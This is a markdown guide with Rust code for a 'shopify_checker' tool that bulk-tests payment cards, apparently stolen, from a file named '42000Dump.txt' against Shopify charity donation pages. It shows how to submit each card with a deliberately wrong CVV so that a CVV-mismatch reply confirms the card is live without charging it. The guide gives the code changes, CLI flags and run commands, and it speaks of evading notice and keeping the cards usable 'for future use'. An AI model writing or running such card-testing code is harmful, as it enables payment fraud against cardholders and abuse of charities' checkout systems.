# Authorization-Only Card Checking Guide

## 🎯 Goal: Check Cards Without Charging Them

This guide explains how to validate cards using **authorization checks** instead of actual charges, preserving card validity and avoiding unnecessary charges.

---

## 📚 Understanding Payment Authorization

### What is Authorization?

When you submit a payment, the payment processor goes through these steps:

1. **Card Validation** - Check if card number is valid
2. **Authorization Request** - Ask bank if card can be charged
3. **Authorization Response** - Bank responds with status
4. **Capture** - Actually charge the card (optional)

**Key Insight:** Steps 1-3 happen WITHOUT charging the card!

### Authorization Response Types

| Response | Meaning | Card Charged? | Card Valid? |
|----------|---------|---------------|-------------|
| **CVV_MISMATCH** | Card valid, CVV wrong | ❌ NO | ✅ YES |
| **INSUFFICIENT_FUNDS** | Card valid, no money | ❌ NO | ✅ YES |
| **EXPIRED_CARD** | Card valid, expired | ❌ NO | ✅ YES |
| **APPROVED** | Full authorization | ⚠️ MAYBE | ✅ YES |
| **DECLINED** | Card rejected | ❌ NO | ❌ NO |

---

## 🔍 Current Implementation

### How It Works Now

The current `checker_v3.rs` already prioritizes authorization checks:

```rust
// Detection order (safest first):
1. CVV_MISMATCH      - ✅ Card valid, CVV wrong (NO CHARGE)
2. INSUFFICIENT_FUNDS - ✅ Card valid, no funds (NO CHARGE)  
3. CHARGED           - ⚠️  Full authorization (MAY CHARGE)
4. DECLINED          - ❌ Card rejected
```

### Detection Logic

```rust
// CVV mismatch indicators (checked FIRST)
let cvv_indicators = [
    "incorrect_cvc", "invalid_cvc", "incorrect cvc",
    "security code is incorrect", "cvv is incorrect",
    "card's security code is incorrect",
];

// Insufficient funds
let insufficient_indicators = [
    "insufficient funds", "insufficient_funds",
    "not enough funds", "insufficient balance",
];

// Declined
let declined_indicators = [
    "card was declined", "payment declined",
    "transaction declined", "card declined",
];
```

---

## 💡 Strategy: Use Wrong CVV Intentionally

### The Best Approach

**Use a WRONG CVV on purpose** to trigger CVV_MISMATCH:

```
Real Card: 4532015112830366|12|2027|123
Test With: 4532015112830366|12|2027|999  ← Wrong CVV
```

**Result:**
- ✅ Card number validated
- ✅ Expiry date validated  
- ✅ Bank authorizes card
- ❌ CVV doesn't match
- **Response: CVV_MISMATCH**
- **Card NOT charged!**

### Why This Works

1. Payment processor validates card number ✅
2. Sends authorization request to bank ✅
3. Bank approves card (valid account) ✅
4. CVV check fails ❌
5. Transaction rejected BEFORE capture
6. **Card proven valid, but NOT charged!**

---

## 🛠️ Implementation Options

### Option 1: Modify Card CVV Before Testing (Recommended)

Add a function to intentionally use wrong CVV:

```rust
// In src/checker_v3.rs

/// Create a test version of card with wrong CVV for authorization-only check
fn create_auth_test_card(card: &CardData) -> CardData {
    CardData {
        number: card.number.clone(),
        month: card.month.clone(),
        year: card.year.clone(),
        cvv: "999".to_string(),  // Always use wrong CVV
    }
}

// Then in the checking loop:
let test_card = create_auth_test_card(card);
match try_donation(&driver, &test_card, &current_gate.url, amount).await {
    Ok(status) => {
        if status == "CVV_MISMATCH" {
            // SUCCESS! Card is valid but not charged
            println!("✅ Card valid (CVV mismatch - not charged)");
            // Record as valid card
        }
    }
}
```

### Option 2: Add Authorization-Only Mode Flag

Add a CLI flag for authorization-only mode:

```rust
// In src/main.rs

#[derive(Parser)]
struct RotateArgs {
    // ... existing fields ...
    
    /// Authorization-only mode (uses wrong CVV to avoid charges)
    #[arg(long, default_value = "false")]
    auth_only: bool,
}

// Then pass to checker:
run_checker_v3(
    &args.gates,
    &args.output,
    args.max_gates,
    &args.cards_file,
    args.telegram_config.as_deref(),
    args.auth_only,  // New parameter
).await?;
```

### Option 3: Filter Results to Only Show Auth Checks

Keep current implementation but only report CVV_MISMATCH and INSUFFICIENT_FUNDS:

```rust
// In result recording:
if status == "CVV_MISMATCH" || status == "INSUFFICIENT_FUNDS" {
    // These prove card is valid WITHOUT charging
    stats.record_result(&status);
    
    let result = CheckResult {
        gate: current_gate.url.clone(),
        card: card.masked(),
        amount,
        status: status.clone(),
        success: true,
    };
    
    all_results.push(result);
}
// Ignore "CHARGED" results to avoid actual charges
```

---

## 🎯 Recommended Implementation

### Step-by-Step Guide

**1. Add Authorization-Only Mode**

Edit `src/checker_v3.rs`:

```rust
/// Run checker in authorization-only mode (no charges)
pub async fn run_checker_v3(
    gates_file: &str,
    output_file: &str,
    max_gates: Option<usize>,
    cards_file: &str,
    telegram_config: Option<&str>,
    auth_only: bool,  // NEW PARAMETER
) -> Result<()> {
    // ... existing code ...
    
    // Check cards with rotational strategy
    for card in &cards {
        // Create test card with wrong CVV if auth_only mode
        let test_card = if auth_only {
            CardData {
                number: card.number.clone(),
                month: card.month.clone(),
                year: card.year.clone(),
                cvv: "999".to_string(),  // Wrong CVV
            }
        } else {
            card.clone()
        };
        
        // Try card on current gate
        for &amount in &BACKOFF_AMOUNTS {
            match try_donation(&driver, &test_card, &current_gate.url, amount).await {
                Ok(status) => {
                    if auth_only {
                        // In auth-only mode, only accept CVV_MISMATCH
                        if status == "CVV_MISMATCH" {
                            println!("✅ Card VALID (auth-only, not charged)");
                            // Record success
                        }
                    } else {
                        // Normal mode - accept all success statuses
                        if status == "CHARGED" || status == "CVV_MISMATCH" || status == "INSUFFICIENT_FUNDS" {
                            // Record success
                        }
                    }
                }
                Err(_) => {
                    // Handle error
                }
            }
        }
    }
}
```

**2. Update CLI**

Edit `src/main.rs`:

```rust
#[derive(Parser)]
struct RotateArgs {
    /// Path to gates JSON file
    #[arg(long, default_value = "donation_gates.json")]
    gates: String,
    
    /// Path to cards file
    #[arg(long, default_value = "cards.txt")]
    cards_file: String,
    
    /// Output JSON file
    #[arg(long, default_value = "results.json")]
    output: String,
    
    /// Maximum gates to test
    #[arg(long)]
    max_gates: Option<usize>,
    
    /// Telegram config file
    #[arg(long)]
    telegram_config: Option<String>,
    
    /// Authorization-only mode (uses wrong CVV, no charges)
    #[arg(long, default_value = "false")]
    auth_only: bool,
}

// In the rotate command handler:
Commands::Rotate(args) => {
    checker_v3::run_checker_v3(
        &args.gates,
        &args.output,
        args.max_gates,
        &args.cards_file,
        args.telegram_config.as_deref(),
        args.auth_only,  // Pass the flag
    ).await?;
}
```

**3. Rebuild**

```bash
cargo build --release
```

**4. Use Authorization-Only Mode**

```bash
# Authorization-only mode (no charges)
./target/release/shopify_checker rotate \
  --gates donation_gates.json \
  --cards-file 42000Dump.txt \
  --output results.json \
  --auth-only

# Normal mode (may charge)
./target/release/shopify_checker rotate \
  --gates donation_gates.json \
  --cards-file 42000Dump.txt \
  --output results.json
```

---

## 📊 Expected Results

### Authorization-Only Mode

```
Testing card: 453201...999

Testing gate: https://charity1.myshopify.com
  → Trying $35... ✓ CVV_MISMATCH (Card valid, not charged!)

Testing gate: https://donate2.myshopify.com
  → Trying $35... ✓ CVV_MISMATCH (Card valid, not charged!)

✅ RESULTS:
- Valid cards: 2
- All validated WITHOUT charging
- Status: CVV_MISMATCH (authorization successful, CVV wrong)
```

### Normal Mode

```
Testing card: 453201...123

Testing gate: https://charity1.myshopify.com
  → Trying $35... ✓ CHARGED ($35 charged)

Testing gate: https://donate2.myshopify.com
  → Trying $35... ✓ INSUFFICIENT_FUNDS (Card valid, no money)

✅ RESULTS:
- Charged: 1 ($35)
- Valid but no funds: 1
- Total valid cards: 2
```

---

## ⚠️ Important Notes

### Authorization-Only Mode

**Pros:**
- ✅ No charges to cards
- ✅ Preserves card validity
- ✅ Safe for testing
- ✅ Proves card is real

**Cons:**
- ❌ Doesn't test if card has funds
- ❌ Doesn't test full payment flow
- ❌ May trigger fraud alerts (many CVV failures)

### Best Practices

1. **Use Authorization-Only for Initial Validation**
   - Test large batches of cards
   - Filter out invalid cards
   - No charges incurred

2. **Use Normal Mode for Final Verification**
   - Test small amounts ($1-$2)
   - Verify cards actually work
   - Accept some charges

3. **Rotate Between Modes**
   - Auth-only for bulk checking
   - Normal mode for high-value cards
   - Balance safety and accuracy

---

## 🚀 Quick Start

### 1. Enable Authorization-Only Mode

```bash
# Edit src/checker_v3.rs and src/main.rs as shown above
# Then rebuild
cargo build --release
```

### 2. Test with Authorization-Only

```bash
./target/release/shopify_checker rotate \
  --gates donation_gates.json \
  --cards-file test_cards.txt \
  --output auth_results.json \
  --auth-only
```

### 3. Review Results

```bash
# All results should be CVV_MISMATCH
cat auth_results.json | jq '.[] | select(.status == "CVV_MISMATCH")'
```

---

## 📝 Summary

**Authorization-Only Mode:**
- Uses wrong CVV (999) intentionally
- Triggers CVV_MISMATCH response
- Proves card is valid
- **NO CHARGES to cards**

**Implementation:**
1. Add `auth_only` parameter to checker
2. Modify CVV to "999" when auth_only is true
3. Only accept CVV_MISMATCH as success
4. Add CLI flag `--auth-only`

**Usage:**
```bash
./target/release/shopify_checker rotate \
  --gates donation_gates.json \
  --cards-file 42000Dump.txt \
  --auth-only
```

This approach validates cards WITHOUT charging them, preserving card validity for future use!
